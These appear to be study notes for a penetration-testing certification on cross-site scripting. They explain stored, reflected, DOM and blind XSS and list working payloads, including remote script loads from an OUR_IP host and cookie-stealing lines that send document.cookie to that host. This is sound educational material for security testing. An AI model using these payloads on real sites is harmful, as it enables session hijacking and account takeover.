XSS Attacks are attacks that takes advantage of poor sanitization to write JSCode into a page and have it executed on the client side

Stored XSS:

Stored or Persistent XSS refers to a payload getting injected into a back-end database and upon the retrieval of its content, the client that loads our injected payload will be affected, the most common case of this is one to leave a XSS payload like the following:
```
<script>alert(window.origin)</script>
```
Into a comment section or some sort of discuss forum, then whoever load up the page will get affected by the XSS payload

Reflected XSS:

Reflected XSS refers to a vulnerabilities that our input reached the back end server, and it get returned to us without being filtered or sanitized, for example if we access a page with some sort of parameter that requires entering from user, after entering a nonvalid parameter the server responds to us that:
```
The parameter 'hamigua' is not valid.
```
Then, we can try stick in XSS payload in where we would enter hamigua, as apparently it got returned to us when error is occured

This could be used to target other user if, let's say, the parameter is sent via the use of URL, like in the following:

http://example.com/index.php?params=hamigua

we can see that the parameter is passed by params =, if we sent someone the following link:
```
http://example.com/index.php?params=<script>alert(window.origin)</script>
```

Then whenever other user clicks it, they would be attacked

DOM XSS:

DOM XSS occurs when the webpage itself use a js function to change the view of the webpage, for sink functions (js function that writes user input to DOM objects on the page) that does not properly sanitize user input and write user input as is to change DOM Object, DOM XSS occurs

Refer to https://academy.hackthebox.com/app/module/103/section/974 for more info

Automated Discovery Tools:

To automate discovery of XSS, we can use a variety of tools to aid us in the process, aside from automated scanner like nessus and ZAP, we can use XSStrike to auto discover the presence of XSS Vulnerability.

```
python xsstrike.py -u "<url>" 
```

*Due to nature of CPTS, defacing and phishing will be intentionally skipped*

Session Hijacking:

Modern webapp usually utilize cookies to maintain a user's session with the server, with cookie, user can only login once and keep the logged-in status alive for some amount of time by presenting cookies to the webserver instead of simply having to login again. With XSS vulnerability, that means we get to execute some js code on victim's browser, we might be able to perform session hijacking.

Blind XSS vulnerability:

Blind XSS Vulnerability refers to a xss vulnerability that is triggered on a page we dont have access to, usually this can be exploited if we are able to pass along some data to interact with that certain page we do not have access toi (example: a registration approval page that populate registration details for admin to approval, notice that the details are entered by us), we can open a server up and setup xss payload to determine which fields of entry have a XSS Vulnerability, we can refer to following list of common payload, for more payload, refer to https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss:

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
After finish identifying, we can use different payloads to have the victim sent its cookie to us, below is some of the payloads available, these payload can also be inputted into a script under our control, then have the victim to load that respective script from our side so that we dont need to expose the payload directly:
```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Again, refer to payload all the things to discover more payload, also refer to https://academy.hackthebox.com/app/module/103/section/1008 for more detail